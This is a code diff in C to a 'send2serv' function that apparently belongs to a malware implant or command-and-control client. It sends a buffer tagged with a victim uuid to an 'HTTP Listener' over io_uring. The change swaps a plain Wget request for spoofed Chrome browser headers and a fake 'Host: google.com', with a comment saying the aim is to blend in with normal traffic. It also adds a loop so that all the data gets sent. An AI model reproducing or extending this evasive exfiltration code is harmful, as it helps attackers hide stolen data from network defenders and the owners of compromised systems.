@@ -20,61 +20,63 @@ int send2serv(const char *uuid, const char *buf, size_t len) {
     request_t *req = malloc(sizeof(request_t));
     int sockfd = connection(&ring, req);
 
+    // Add a bunch of dummy headers from google to blend in with normal-ish traffic
+    //Only things that matter are the uuid and the content-length. I've tested it and it doens't work without content-length
     char header_buffer[1024];
     int header_len = snprintf(header_buffer, sizeof(header_buffer),
         "POST /login?uuid=%s HTTP/1.1\r\n"
         "Host: google.com\r\n"
-        "User-Agent: Wget/1.20.3 (linux-gnu)\r\n"
-        "Accept: */*\r\n"
+        "Accept-Language: en-US,en;q=0.\r\n"
+        "Upgrade-Insecure-Requests: 1\r\n"
+        "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36\r\n"
+        "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7\r\n"
         "Content-Length: %lu\r\n"
-        "Content-Type: text/plain\r\n"
-        "Connection: close\r\n\r\n",
+        "Sec-Ch-Ua-Mobile: ?0\r\n"
+        "X-Client-Data: CNGLywE=\r\n"
+        "Sec-Fetch-Site: none\r\n"
+        "Sec-Fetch-Mode: navigate\r\n"
+        "Sec-Fetch-User: ?1\r\n"
+        "Sec-Fetch-Dest: document\r\n"
+        "Accept-Encoding: gzip, deflate, br\r\n"
+        "Priority: u=0, i\r\n"
+        "Connection: keep-alive\r\n\r\n",
         uuid, len);
 
     if (header_len <= 0 || header_len >= sizeof(header_buffer)) {
         return -1;
     }
 
-    char *full_req = malloc(header_len + len);
-    if (!full_req) return -1;
-
-    memcpy(full_req, header_buffer, header_len);
-    memcpy(full_req + header_len, buf, len);
-
-    //printf("%s", full_req);
+    // Initialize the sqe and send the headers back to the HTTP Listener
     struct io_uring_sqe *sqe = io_uring_get_sqe(&ring);
-    io_uring_prep_send(sqe, sockfd, full_req, header_len + len, 0);
+    io_uring_prep_send(sqe, sockfd, header_buffer, header_len, 0);
     io_uring_submit(&ring);
 
     struct io_uring_cqe *cqe;
     io_uring_wait_cqe(&ring, &cqe);
     if (cqe->res < 0) {
-        //printf("\nHeader Sending Failed\n");
         return -1;
     }
-
+    // Mark as seen
     io_uring_cqe_seen(&ring, cqe);
 
-    /*char response_buffer[1024];
-    sqe = io_uring_get_sqe(&ring);
-    io_uring_prep_recv(sqe, sockfd, response_buffer, sizeof(response_buffer) - 1, 0);
-    io_uring_sqe_set_data(sqe, response_buffer);
-    io_uring_submit(&ring);
-    io_uring_wait_cqe(&ring, &cqe);
+    // Ensures all data is sent. Only problem is this is synchronous/blocking and doesn't take advantage of io_uring's advantage in perform asynchronous tasks. 
+    size_t sent = 0;
+    while (sent < len) {
+        struct io_uring_sqe *sqe = io_uring_get_sqe(&ring);
+        io_uring_prep_send(sqe, sockfd, buf + sent, len - sent, 0);
+        io_uring_submit(&ring);
 
-    if (cqe->res > 0) {
-        response_buffer[cqe->res] = '\0';
-    } else {
-        //printf("\nReceive Failed!!\n");
-        return -1;
+        struct io_uring_cqe *cqe;
+        io_uring_wait_cqe(&ring, &cqe);
+        int ret = cqe->res;
+        io_uring_cqe_seen(&ring, cqe);
+
+        if (ret <= 0) return ret;
+        sent += ret;
     }
-
-    io_uring_cqe_seen(&ring, cqe);*/
-
 
     close(req->client_socket);
     io_uring_queue_exit(&ring);
-    free(full_req);
     free(req);
-    return 0;
+    return sent;
 }
